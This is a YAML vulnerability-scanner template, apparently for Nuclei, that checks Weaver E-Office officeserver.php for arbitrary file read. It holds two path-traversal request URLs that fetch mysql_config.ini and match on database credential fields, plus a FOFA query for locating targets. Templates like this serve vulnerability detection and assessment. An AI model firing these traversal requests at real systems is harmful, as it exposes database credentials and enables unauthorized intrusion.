id: weaver-eoffice-officeserver-fileread

info:
  name: 泛微 E-office officeserver.php - fileread
  author: SleepingBag945,leadlife
  severity: high
  description: |
    There is an arbitrary file reading vulnerability in the OA E-Office officeserver.php file. An attacker can download any file on the server through the vulnerability.
  reference:
    - https://github.com/PeiQi0/PeiQi-WIKI-Book/blob/main/docs/wiki/oa/%E6%B3%9B%E5%BE%AEOA/%E6%B3%9B%E5%BE%AEOA%20E-Office%20officeserver.php%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md
    - https://github.com/exp999fuck/poc_yaml/blob/main/xray-poc/xray-poc-fanwei-e-office-officeServer2.php-fileread.yml
  metadata:
    verified: true
    max-request: 1
    fofa-query: app="泛微-EOffice"
  tags: weaver,oa,fileread,eoffice

http:
  - method: GET
    path:
      - "{{BaseURL}}/iweboffice/officeserver2.php?OPTION=LOADTEMPLATE&COMMAND=INSERTFILE&TEMPLATE=../../bin/mysql_config.ini"
      - "{{BaseURL}}/iweboffice/officeserver.php?OPTION=LOADFILE&FILENAME=../mysql_config.ini"

    stop-at-first-match: true
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "datapassword"
          - "datauser"
        condition: and

      - type: status
        status:
          - 200

